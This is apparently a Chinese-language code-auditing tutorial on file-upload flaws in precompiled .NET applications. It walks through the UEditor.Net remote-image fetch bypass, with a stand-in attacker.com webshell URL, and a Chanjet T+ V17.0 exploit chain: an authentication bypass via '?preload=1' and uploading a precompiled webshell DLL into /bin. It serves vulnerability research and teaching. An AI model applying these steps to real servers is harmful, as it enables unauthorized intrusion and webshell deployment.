@@ -1,0 +1,118 @@
+在Web应用安全领域，文件上传漏洞始终是高危且常见的攻击面。对于基于.NET Framework构建的应用程序，其独特的预编译机制和事件驱动架构为安全研究者带来了全新的挑战与机遇。本文将从.NET的文件类型与架构基础出发，深入解析其预编译调用机制，并结合“用友畅捷通T+”与“UEditor.Net”两个真实案例，完整演示如何从黑盒功能点逆向定位代码，最终实现漏洞的挖掘与利用。
+
+一、.NET原生架构基础：从文件后缀到运行逻辑
+
+在开始代码审计前，理解.NET项目各类文件的作用及其在运行时的关系至关重要。以下是核心文件类型解析：
+
+文件后缀 名称 核心作用与审计关注点
+.aspx Web窗体页面 用户请求的入口，包含界面UI。预编译后，原始文件仅作为占位符存在。
+.aspx.cs 代码隐藏文件 包含页面逻辑，如按钮点击事件 btnSave_Click。是审计逻辑缺陷的直接目标。
+.dll 编译后的程序集 预编译后，所有逻辑代码都被封装在此。位于/bin目录，是反编译审计的主要对象。
+.ashx 一般处理程序 轻量级的HTTP请求处理器，常用于提供动态内容（如文件处理、图片输出），是审计接口安全的重点。
+.asax 全局应用程序类 通常是Global.asax，包含应用程序生命周期事件（如Application_PreRequestHandlerExecute）。常用于实现全局身份验证或请求过滤，是挖掘权限绕过的关键点。
+.compiled 预编译部署文件 一个XML文件，记录了原始ASPX文件与对应DLL文件之间的映射关系。通过它，我们可以从路由反查DLL。
+
+架构特点：.NET应用采用事件驱动模型。例如，当用户访问Upload.aspx并点击上传按钮时，会触发其后台代码（.aspx.cs）中对应的事件处理方法（如btnSave_Click）。因此，审计逻辑漏洞时，应重点关注事件处理函数内部的实现。
+
+二、深入预编译机制：DLL为王，源码为辅
+
+预编译是.NET平台为了提高性能和保护源码而设计的机制。简单来说，它在部署时将所有的.aspx、.cs等文件编译成一个或多个DLL文件，存放在/bin目录下。
+
+1. 运行机制
+当一个请求到来时，如 /tplus/SM/SetupAccount/Upload.aspx，.NET运行时并不会直接解析原始的Upload.aspx文件，而是：
+
+· 查找/bin目录下对应的.compiled文件。
+· 该文件指引运行时加载对应的程序集（如 App_Web_upload.aspx.9475d17f.dll）。
+· DLL中的类接管请求，执行业务逻辑并返回响应。
+
+2. 对审计的影响
+
+· 优点：无法直接从服务器上的.aspx文件看到完整逻辑，增加了审计门槛。
+· 方法：必须将目标DLL反编译（工具如dnSpy, ILSpy）才能进行源码审计。
+· 逆向思路：功能点 -> URL路由 -> 查找对应.compiled文件 -> 反编译对应DLL -> 定位关键类和函数。这是审计预编译应用的标准路径。
+
+三、实战案例一：UEditor.Net文件上传（通用漏洞审计）
+
+UEditor是常用的富文本编辑器，其.Net版本曾存在一个经典的文件上传绕过漏洞。此案例展示了如何通过静态代码审计发现路径处理函数的逻辑缺陷。
+
+1. 漏洞点定位
+漏洞位于/net/controller.ashx?action=catchimage。这是一个一般处理程序（.ashx），用于远程图片抓取功能。
+
+2. 源码分析（反编译视角）
+在CrawlerHandler类中，程序通过Fetch方法获取远程图片。核心问题出在PathFormatter类对文件名的处理：
+
+```csharp
+// 关键代码逻辑示例
+using System;
+using System.IO;
+
+class Program
+{
+    public static void Main(string[] args)
+    {
+        // 假设从用户请求中获取的图片URL为： http:// attacker.com/shell.jpg?.aspx
+        string url = "http://attacker.com/shell.jpg?.aspx";
+
+        // Path.GetFileName 获取的是 "shell.jpg?.aspx"
+        Console.WriteLine(Path.GetFileName(url));
+        // Path.GetExtension 仅获取最后一个 '.' 及其后面的内容，得到 ".aspx"
+        Console.WriteLine(Path.GetExtension(url));
+    }
+}
+```
+
+缺陷原理：程序期望抓取图片文件，但使用Path.GetExtension来获取文件后缀。攻击者利用URL特性，在真实文件名后添加?.aspx。Path.GetExtension错误地将?.aspx识别为文件后缀，导致最终保存的文件名为shell.jpg.aspx，从而绕过了图片格式检查，写入WebShell。
+
+3. 审计结论
+这是一个典型的输入验证不严导致的漏洞，通过构造特殊的URL即可实现任意文件写入。该漏洞在Hdhcms等使用了该版本UEditor的系统中普遍存在，体现了第三方组件审计的重要性。
+
+四、实战案例二：用友畅捷通T+ 任意文件上传（深度挖掘）
+
+此案例是审计预编译企业应用的典范，展示了如何结合权限绕过和预编译特性，组合利用漏洞。
+
+1. 漏洞发现：从功能点到DLL
+在畅捷通T+ V17.0版本中，发现一个文件上传功能点：/tplus/SM/SetupAccount/Upload.aspx。
+
+· 逆向定位：在/bin目录下查找包含Upload的.compiled文件，发现App_Web_upload.aspx.9475d17f.compiled，指向App_Web_upload.aspx.9475d17f.dll。
+· 反编译分析：使用dnSpy打开该DLL，找到对应的类（如CommonPage_SetupAccount_Upload），定位到文件上传事件（如btnSave_Click或DoFileUpload）。审计发现，代码仅通过MIME类型验证上传文件是否为图片（image/jpeg等），并未对文件后缀进行任何过滤。上传点存在缺陷。
+
+2. 权限绕过：从全局拦截器到参数注入
+直接访问上传点会跳转至登录页。显然存在权限控制。
+
+· 定位拦截器：全局权限校验通常在Global.asax中实现。在/bin下找到App_Web_global.asax.cs.cdcab7d2.dll，反编译后找到Application_PreRequestHandlerExecute方法。该方法在每个请求被处理前执行，是实现身份验证的绝佳位置。
+· 绕过逻辑一（preload参数）：查看反编译代码：
+  ```csharp
+  bool flag = context.Request.QueryString["preload"] == "1";
+  if (flag)
+  {
+      return; // 直接返回，跳过后续所有验证
+  }
+  ```
+  这意味着，只要在请求中加上?preload=1，即可完全绕过身份验证。
+· 绕过逻辑二（白名单包含）：另一处逻辑检查请求URL是否包含特定白名单路径（如/login.aspx），如果包含则跳过验证。通过分析RequestChecker.IsBaseRquest方法，发现它使用Contains判断。因此，构造/tplus/SM/SetupAccount/Upload.aspx?login=1，使URL包含login，同样可以绕过。
+
+3. 最终利用：预编译环境的Shell写入
+现在可以未授权访问上传点，并上传任意文件。但由于应用是预编译的，即使上传一个包含恶意代码的.aspx文件，服务器也不会解析执行，因为它永远不会被编译。
+
+· 解决方案：攻击者需要上传已编译好的程序集到/bin目录。
+· 操作步骤：
+  1. 本地编译：使用aspnet_compiler.exe将包含WebShell的.aspx文件预编译。
+     ```bash
+     # -p 指定源码目录，-D 指定输出目录
+     C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe -v \ -p C:\webshell_source -D C:\compiled_output
+     ```
+  2. 获取产物：从输出目录的/bin下得到关键的xxx.dll和xxx.compiled文件。
+  3. 组合上传：通过未授权的上传点，先后将这两个文件上传至目标服务器的/bin目录。
+  4. 访问触发：根据.compiled文件中的映射关系，访问对应的虚拟路径（如/tplus/SM/SetupAccount/任意名字.aspx），即可触发DLL中的WebShell。
+
+五、总结：.NET代码审计方法论
+
+通过以上理论与实践的结合，我们可以总结出针对.NET原生应用，特别是预编译架构应用的审计方法论：
+
+1. 架构先导：首先识别目标是否为预编译应用（查看是否存在/bin/*.compiled文件）。这决定了后续的审计路径（是直接看源码还是反编译DLL）。
+2. 逆向溯源：从任意一个功能点的URL出发，利用.compiled文件找到对应的DLL，这是进入代码世界的入口。
+3. 全局排查：重点关注Global.asax编译后的DLL，寻找全局性的身份验证、授权和请求过滤逻辑。这往往是挖掘权限绕过漏洞的金矿。
+4. 敏感点追踪：在业务DLL中，搜索SaveAs、Stream、Upload、Path.GetExtension、MimeType等关键字，快速定位文件上传、文件操作等敏感函数。
+5. 组合利用：将业务逻辑漏洞（如文件上传过滤不严）与架构机制缺陷（如权限绕过、预编译特性）相结合，才能构成完整的、高危害的攻击链。
+
+理解架构是深度挖掘漏洞的前提，而掌握反编译与逆向分析则是开启代码世界的钥匙。希望本文能为您在.NET代码审计的实践中提供有益的参考。
